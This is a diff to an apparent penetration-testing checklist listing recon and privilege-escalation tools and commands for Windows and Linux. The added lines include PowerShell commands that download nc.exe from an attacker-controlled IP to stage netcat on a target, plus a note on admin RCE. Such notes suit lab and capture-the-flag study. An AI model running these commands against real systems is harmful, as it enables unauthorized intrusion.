@@ -6,6 +6,7 @@
 - dirb | dirsearch
 - linpeas
 - wpsscan -U user -P password
+- [crackmapexec](https://www.crackmapexec.wiki/)
 
 ## Basic network
 - nmap (all ports)
@@ -24,7 +25,7 @@
 - sqlmap
 
 ## Windows
-- /priv
+- whoami /priv
 - systeminfo
 - smb read/write
   - --script=smb-enum-shares.nse,smb-enum-users.nse
@@ -41,6 +42,7 @@
 - Permissions:
   - icalcs
 - eventvwr
+- RCE admin: change user
   
 ## Linux
 - sudo -l
@@ -64,6 +66,8 @@
 
 ## Upload files
 ### Windows
+- powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
+- powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
 ### Linux
 
 
